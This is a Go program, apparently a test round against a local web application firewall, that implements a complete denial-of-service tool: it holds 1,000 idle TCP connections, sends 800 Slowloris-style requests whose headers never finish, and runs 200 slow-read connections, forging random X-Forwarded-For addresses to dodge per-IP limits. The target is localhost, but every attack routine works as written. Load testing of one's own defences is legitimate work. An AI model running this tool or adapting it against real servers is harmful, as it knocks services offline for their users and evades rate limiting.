// Round 13 L4 DDoS Attack Tool - TCP Connection Exhaustion + Slow Read
// Targets the TRANSPORT layer (L4):
//   1. TCP Connection Hold: open raw TCP connections without sending any HTTP data.
//      Fills server's accept queue and connection table. Pure L4 attack.
//   2. Slow Headers: send HTTP headers line-by-line with long delays between lines.
//      Final \r\n\r\n is NEVER sent. Server waits in header-read state.
//      Attacks at L4/L7 boundary — HTTP-aware but connection-exhaustion goal.
//   3. Slow Read: complete valid GET, then read response 1 byte at a time with
//      seconds-long delays. Ties up server in write-loop.
//
// Usage: go run round13_ddos_l4.go

package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	TargetHost = "127.0.0.1:8081"
	AdminURL   = "http://127.0.0.1:9090/stats"

	// Pure TCP hold attack
	TCPHoldConns = 1000
	TCPHoldTime  = 45 * time.Second

	// Slow header attack
	SlowHeaderConns    = 800
	LineDelayMin       = 3 * time.Second
	LineDelayMax       = 10 * time.Second

	// Slow read attack
	SlowReadConns  = 200
	SlowReadDelay  = 2 * time.Second

	// Overall
	ConnRampUp  = 50
	RampUpDelay = 100 * time.Millisecond
	Duration    = 50 * time.Second
)

type ConnStats struct {
	activeConns int64
	totalOpened int64
	totalClosed int64
	connErrors  int64
	slowBytes   int64
}

func randomIP(rng *rand.Rand) string {
	subnets := [][]int{
		{10, 0, 0, 0}, {172, 16, 0, 0}, {192, 168, 0, 0},
		{100, 64, 0, 0}, {1, 0, 0, 0}, {45, 0, 0, 0},
		{103, 0, 0, 0}, {114, 0, 0, 0}, {116, 0, 0, 0},
		{117, 0, 0, 0}, {118, 0, 0, 0}, {119, 0, 0, 0},
		{121, 0, 0, 0}, {123, 0, 0, 0}, {124, 0, 0, 0},
		{125, 0, 0, 0}, {180, 0, 0, 0}, {182, 0, 0, 0},
		{183, 0, 0, 0}, {202, 0, 0, 0}, {203, 0, 0, 0},
		{210, 0, 0, 0}, {211, 0, 0, 0}, {218, 0, 0, 0},
		{219, 0, 0, 0}, {220, 0, 0, 0}, {221, 0, 0, 0},
		{222, 0, 0, 0}, {223, 0, 0, 0},
	}
	s := subnets[rng.Intn(len(subnets))]
	a := s[0] + rng.Intn(256-s[0])
	if a > 255 { a = s[0] }
	return fmt.Sprintf("%d.%d.%d.%d", a, rng.Intn(256), rng.Intn(256), rng.Intn(254)+1)
}

func getMetrics() string {
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Get(AdminURL)
	if err != nil { return fmt.Sprintf("error: %v", err) }
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}

// Pure TCP hold: connect and hold without sending ANY data.
// Pure L4 attack — no HTTP semantics at all.
func tcpHold(id int, stats *ConnStats, stopCh chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	dialer := net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.Dial("tcp", TargetHost)
	if err != nil {
		atomic.AddInt64(&stats.connErrors, 1)
		return
	}
	atomic.AddInt64(&stats.activeConns, 1)
	atomic.AddInt64(&stats.totalOpened, 1)
	defer func() {
		conn.Close()
		atomic.AddInt64(&stats.activeConns, -1)
		atomic.AddInt64(&stats.totalClosed, 1)
	}()

	// Hold the connection open — server goroutine waits to read HTTP request
	select {
	case <-stopCh:
	case <-time.After(TCPHoldTime):
	}
}

// Slow headers: send HTTP headers line-by-line with delays, never finish.
// Server sees a valid HTTP start-line, expects headers, gets them very slowly.
// The final \r\n\r\n (end-of-headers marker) is NEVER sent.
func slowHeaders(id int, stats *ConnStats, stopCh chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
	ip := randomIP(rng)

	// Headers to send line by line
	lines := []string{
		fmt.Sprintf("GET / HTTP/1.1\r\n"),
		fmt.Sprintf("Host: 127.0.0.1:8081\r\n"),
		fmt.Sprintf("X-Forwarded-For: %s\r\n", ip),
		fmt.Sprintf("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36\r\n"),
		fmt.Sprintf("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"),
		fmt.Sprintf("Accept-Language: en-US,en;q=0.5\r\n"),
		fmt.Sprintf("Connection: keep-alive\r\n"),
		// NOTE: final \r\n\r\n intentionally never sent
	}

	dialer := net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.Dial("tcp", TargetHost)
	if err != nil {
		atomic.AddInt64(&stats.connErrors, 1)
		return
	}
	atomic.AddInt64(&stats.activeConns, 1)
	atomic.AddInt64(&stats.totalOpened, 1)
	defer func() {
		conn.Close()
		atomic.AddInt64(&stats.activeConns, -1)
		atomic.AddInt64(&stats.totalClosed, 1)
	}()

	for _, line := range lines {
		select {
		case <-stopCh:
			return
		default:
		}
		_, err := conn.Write([]byte(line))
		if err != nil {
			atomic.AddInt64(&stats.connErrors, 1)
			return
		}
		// Delay between header lines
		delay := LineDelayMin + time.Duration(rng.Intn(int(LineDelayMax-LineDelayMin)))
		select {
		case <-stopCh:
			return
		case <-time.After(delay):
		}
	}

	// All header lines sent but no \r\n\r\n — server stuck in header-read state
	select {
	case <-stopCh:
	case <-time.After(TCPHoldTime):
	}
}

// Slow read: send complete valid HTTP request, read response 1 byte at a time.
func slowRead(id int, stats *ConnStats, stopCh chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)+20000))
	ip := randomIP(rng)

	req := fmt.Sprintf(
		"GET / HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nX-Forwarded-For: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
		ip,
	)

	dialer := net.Dialer{Timeout: 5 * time.Second, KeepAlive: 60 * time.Second}
	conn, err := dialer.Dial("tcp", TargetHost)
	if err != nil {
		atomic.AddInt64(&stats.connErrors, 1)
		return
	}
	atomic.AddInt64(&stats.activeConns, 1)
	atomic.AddInt64(&stats.totalOpened, 1)
	defer func() {
		conn.Close()
		atomic.AddInt64(&stats.activeConns, -1)
		atomic.AddInt64(&stats.totalClosed, 1)
	}()

	_, err = conn.Write([]byte(req))
	if err != nil {
		atomic.AddInt64(&stats.connErrors, 1)
		return
	}

	buf := make([]byte, 1)
	for {
		select {
		case <-stopCh:
			return
		default:
		}
		conn.SetReadDeadline(time.Now().Add(15 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		if n > 0 {
			atomic.AddInt64(&stats.slowBytes, 1)
		}
		delay := SlowReadDelay + time.Duration(rng.Intn(1500))*time.Millisecond
		select {
		case <-stopCh:
			return
		case <-time.After(delay):
		}
	}
}

func launchAttack(label string, count int, fn func(int, *ConnStats, chan struct{}, *sync.WaitGroup), stats *ConnStats, stopCh chan struct{}, wg *sync.WaitGroup) {
	start := time.Now()
	for i := 0; i < count; i++ {
		wg.Add(1)
		go fn(i, stats, stopCh, wg)
		if (i+1)%ConnRampUp == 0 {
			time.Sleep(RampUpDelay)
		}
	}
	active := atomic.LoadInt64(&stats.activeConns)
	errors := atomic.LoadInt64(&stats.connErrors)
	fmt.Printf("  [%s] %s: %d launched, %d active, %d errors\n",
		time.Since(start).Round(time.Second), label, count, active, errors)
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Println("round13_ddos_l4 v1.0")
		return
	}

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("  L4 DDoS ATTACK - TCP Connection Exhaustion")
	fmt.Printf("  TCP Hold: %d | Slow Headers: %d | Slow Read: %d\n",
		TCPHoldConns, SlowHeaderConns, SlowReadConns)
	fmt.Println(strings.Repeat("=", 60))

	fmt.Printf("\nBefore Attack - WAF Metrics:\n%s\n", getMetrics())

	stats := &ConnStats{}
	startTime := time.Now()
	stopCh := make(chan struct{})
	var wg sync.WaitGroup

	// Phase 1: Pure TCP connection hold (clean L4)
	fmt.Println("\n[Phase 1] Pure TCP connection hold (no HTTP data)...")
	launchAttack("tcp_hold", TCPHoldConns, tcpHold, stats, stopCh, &wg)

	// Phase 2: Slow headers (L4/L7 boundary)
	fmt.Println("\n[Phase 2] Slow HTTP headers (line-by-line, never finish)...")
	launchAttack("slow_headers", SlowHeaderConns, slowHeaders, stats, stopCh, &wg)

	// Phase 3: Slow read (L4/L7 boundary)
	fmt.Println("\n[Phase 3] Slow read (1 byte at a time)...")
	launchAttack("slow_read", SlowReadConns, slowRead, stats, stopCh, &wg)

	time.Sleep(1 * time.Second)
	fmt.Printf("\n  Total active connections: %d\n", atomic.LoadInt64(&stats.activeConns))

	// Progress reporting
	ticker := time.NewTicker(10 * time.Second)
	go func() {
		for range ticker.C {
			elapsed := time.Since(startTime)
			fmt.Printf("  [%ds] active=%d opened=%d closed=%d errors=%d slow_bytes=%d\n",
				int(elapsed.Seconds()),
				atomic.LoadInt64(&stats.activeConns),
				atomic.LoadInt64(&stats.totalOpened),
				atomic.LoadInt64(&stats.totalClosed),
				atomic.LoadInt64(&stats.connErrors),
				atomic.LoadInt64(&stats.slowBytes))
		}
	}()

	time.Sleep(Duration)
	fmt.Println("\n[Stopping] Closing all connections...")
	close(stopCh)
	ticker.Stop()
	wg.Wait()

	elapsed := time.Since(startTime)
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("  L4 DDoS Complete — %v\n", elapsed.Round(time.Second))
	fmt.Printf("  Total opened: %d | Closed: %d | Errors: %d\n",
		atomic.LoadInt64(&stats.totalOpened),
		atomic.LoadInt64(&stats.totalClosed),
		atomic.LoadInt64(&stats.connErrors))
	fmt.Printf("  Slow read bytes: %d\n", atomic.LoadInt64(&stats.slowBytes))
	fmt.Println(strings.Repeat("=", 60))

	time.Sleep(2 * time.Second)
	fmt.Printf("\nAfter Attack - WAF Metrics:\n%s\n", getMetrics())
	fmt.Println("\nDone.")
}
